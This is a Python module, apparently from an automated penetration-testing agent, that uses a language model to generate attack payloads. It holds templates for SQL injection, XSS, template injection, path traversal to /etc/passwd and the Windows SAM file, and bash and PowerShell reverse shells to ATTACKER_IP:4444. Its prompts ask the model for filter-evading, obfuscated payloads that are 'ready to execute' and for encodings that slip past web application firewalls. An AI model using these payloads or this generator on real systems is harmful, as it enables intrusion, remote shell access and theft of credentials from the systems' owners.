"""
LLM-Based Payload Generator
Customizes exploit payloads for target environment
"""

import logging
from typing import Optional, Dict, List
from enum import Enum

from agents.llm_client import LLMClient, TaskTier

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    SQLI = "sqli"
    XSS = "xss"
    SSTI = "ssti"
    RCE = "rce"
    LFI = "lfi"
    XXE = "xxe"


# Payload templates - starting points
TEMPLATES = {
    PayloadType.SQLI: {
        "basic": "' OR '1'='1",
        "union": "' UNION SELECT NULL,NULL,NULL --",
        "time_based": "' AND SLEEP(5) --",
    },
    PayloadType.XSS: {
        "basic": "<script>alert(1)</script>",
        "dom": "'\"><script>alert(1)</script>",
        "event": "<img src=x onerror=alert(1)>",
    },
    PayloadType.SSTI: {
        "jinja": "{{7*7}}",
        "erb": "<%= 7*7 %>",
        "mako": "${7*7}",
    },
    PayloadType.RCE: {
        "bash": "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'",
        "powershell": "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);"
    },
    PayloadType.LFI: {
        "linux": "../../../../../../etc/passwd",
        "windows": "..\\..\\..\\windows\\system32\\config\\sam",
    }
}


class PayloadGenerator:
    """LLM-powered payload customization"""

    def __init__(self):
        self.client = LLMClient.get()

    async def generate_sqli(
        self,
        injection_point: str,
        database_type: str,
        detected_filters: List[str] = None
    ) -> str:
        """Generate SQLi payload for target database"""

        template = TEMPLATES[PayloadType.SQLI]["basic"]
        
        # Use LLM to bypass filters
        if not await self.client.is_available():
            return template

        filters_str = ", ".join(detected_filters) if detected_filters else "none"
        prompt = f"""Generate a SQL injection payload for:
Database: {database_type}
Injection point: {injection_point}
Detected filters: {filters_str}

Requirements:
- Start with basic template: {template}
- Bypass each filter mentioned
- Return ONLY the payload, no explanation

Common bypasses:
- Space → %20, /**/, Tab
- Quote → Unicode, Encoding
- Comment → --, #, /**/"""

        payload = await self.client.generate(
            prompt, tier=TaskTier.SMALL, max_tokens=200, temperature=0.2
        )
        return payload.strip() if payload else template

    async def generate_xss(
        self,
        context: str,  # "html", "js", "attribute", "url"
        detected_filters: List[str] = None,
        target_browser: str = "chrome"
    ) -> str:
        """Generate XSS payload for context"""

        template = TEMPLATES[PayloadType.XSS]["basic"]

        if not await self.client.is_available():
            return template

        filters_str = ", ".join(detected_filters) if detected_filters else "none"
        prompt = f"""Generate XSS payload for:
Context: {context} (location in HTML where payload goes)
Filters: {filters_str}
Browser: {target_browser}

Base template: {template}

Return ONLY the payload, no explanation.
Be creative with encoding and obfuscation."""

        payload = await self.client.generate(
            prompt, tier=TaskTier.SMALL, max_tokens=300, temperature=0.3
        )
        return payload.strip() if payload else template

    async def generate_rce(
        self,
        shell_type: str = "bash",  # bash, powershell, php, nodejs
        attacker_ip: str = "ATTACKER_IP",
        port: int = 4444,
        encoding: str = "none"  # none, base64, hex, url
    ) -> str:
        """Generate reverse shell payload"""

        template = TEMPLATES[PayloadType.RCE].get(
            shell_type.lower(), TEMPLATES[PayloadType.RCE]["bash"]
        )

        if not await self.client.is_available():
            return template

        prompt = f"""Generate {shell_type} reverse shell payload:
Target IP: {attacker_ip}
Port: {port}
Encoding: {encoding}

Template: {template}

Return ONLY the encoded payload, ready to execute.
Ensure it connects back to {attacker_ip}:{port}"""

        payload = await self.client.generate(
            prompt, tier=TaskTier.SMALL, max_tokens=400, temperature=0.1
        )
        return payload.strip() if payload else template

    async def generate_lfi(
        self,
        target_os: str = "linux",  # linux, windows
        file_path: str = "etc/passwd",
        encoding: str = "none"
    ) -> str:
        """Generate LFI traversal payload"""

        template = TEMPLATES[PayloadType.LFI].get(
            target_os.lower(), TEMPLATES[PayloadType.LFI]["linux"]
        )

        if not await self.client.is_available():
            return template

        prompt = f"""Generate LFI payload for:
OS: {target_os}
Target file: {file_path}
Encoding: {encoding}

Template: {template}

Return ONLY the payload with correct path traversal for {target_os}."""

        payload = await self.client.generate(
            prompt, tier=TaskTier.SMALL, max_tokens=200, temperature=0.1
        )
        return payload.strip() if payload else template

    async def generate_ssti(
        self,
        template_engine: str,  # jinja, erb, mako, etc
        detected_filters: List[str] = None
    ) -> str:
        """Generate SSTI bypass payload"""

        template = TEMPLATES[PayloadType.SSTI].get(
            template_engine.lower(), TEMPLATES[PayloadType.SSTI]["jinja"]
        )

        if not await self.client.is_available():
            return template

        filters_str = ", ".join(detected_filters) if detected_filters else "none"
        prompt = f"""Generate SSTI payload for {template_engine}:
Base: {template}
Filters: {filters_str}

Return payload that bypasses filters and executes 7*7."""

        payload = await self.client.generate(
            prompt, tier=TaskTier.SMALL, max_tokens=200, temperature=0.2
        )
        return payload.strip() if payload else template

    async def generate_encoding(self, payload: str, encoding: str) -> str:
        """Encode payload for WAF/filter bypass"""

        if not await self.client.is_available():
            return payload

        prompt = f"""Encode this payload with {encoding} for filter bypass:
Original: {payload}

Return ONLY the encoded version."""

        encoded = await self.client.generate(
            prompt, tier=TaskTier.SMALL, max_tokens=300, temperature=0.1
        )
        return encoded.strip() if encoded else payload